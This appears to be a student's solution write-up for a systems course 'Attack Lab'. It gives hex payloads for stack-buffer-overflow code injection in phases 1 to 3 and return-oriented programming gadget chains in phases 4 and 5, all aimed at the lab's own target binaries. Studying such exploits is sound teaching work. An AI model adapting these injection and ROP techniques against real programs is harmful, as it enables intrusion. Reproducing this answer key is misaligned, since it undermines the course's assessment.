# Attack Lab


* Part I: Code Injection Attacks
	+ Phase 1
	+ Phase 2
	+ Phase 3
* Part II: Return-Oriented Programming
	+ Phase 4
	+ Phase 5


In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code.


## Part I: Code Injection Attacks

### Phase 1

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```
0 to 39 bytes:  00

40 to 47 bytes: 0x4017c0 <touch1>


### Phase 2

```
48 c7 c7 fa 97 b9 59     # mov    $0x59b997fa, %rdi     value of cookie
68 ec 17 40 00           # push   $0x4017ec             0x4017ec <touch2>
c3                       # retq
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00  # address of buf
```
0 to 39 bytes:  injected code

40 to 47 bytes: address of buf
```
gdb ctarget
(gdb) break getbuf
(gdb) run
(gdb) p/x $rsp
(gdb) p/x $rsp-0x28      # address of buf
```


### Phase 3

```
48 c7 c7 a8 dc 61 55     # push   $0x5561dca8, %rdi     sval = buf+0x28+0x8  address of my cookie string
68 fa 18 40 00           # push   $0x4018fa             0x4018fa <touch3>
c3                       # retq
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00  # address of buf
35 39 62 39 39 37 66 61  # ASCII representation of my cookie
```
0 to 39 bytes:  injected code

40 to 47 bytes: address of buf

48 to 55 bytes: ASCII representation of my cookie


## Part II: Return-Oriented Programming

### Phase 4

#### Solution 1 (used 1 gadget)
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1b 14 40 00 00 00 00 00  # popq   %rdi                  0x40141b <scramble+0x..>   not in farms, maybe illegal
fa 97 b9 59 00 00 00 00  # cookie = 0x59b997fa 
ec 17 40 00 00 00 00 00  # retq                         0x4017ec <touch2>
```

#### Solution 2 (used 2 gadgets)
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00  # popq   %rax                  58
fa 97 b9 59 00 00 00 00  # cookie = 0x59b997fa
a2 19 40 00 00 00 00 00  # movq   %rax, %rdi            48 89 c7

ec 17 40 00 00 00 00 00  # address of touch2                          0x4017ec <touch2>
```



### Phase 5

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

06 1a 40 00 00 00 00 00  # movq   %rsp, %rax            48 89 e0
a2 19 40 00 00 00 00 00  # movq   %rax, %rdi            48 89 c7

ab 19 40 00 00 00 00 00  # popq   %rax                  58
48 00 00 00 00 00 00 00  # offset   rsp + offset = address of string

dd 19 40 00 00 00 00 00  # movl   %eax, %edx            89 c2
34 1a 40 00 00 00 00 00  # movl   %edx, %ecx            89 d1 (38 c9)
13 1a 40 00 00 00 00 00  # movl   %ecx, %esi            89 ce

d6 19 40 00 00 00 00 00  # lea    (%rdi,%rsi,1),%rax    48 8d 04 37   0x4019d6 <add_xy>

a2 19 40 00 00 00 00 00  # movq   %rax, %rdi            48 89 c7

fa 18 40 00 00 00 00 00  # address of touch3                          0x4018fa <touch3>

35 39 62 39 39 37 66 61  # ASCII representation of my cookie
```
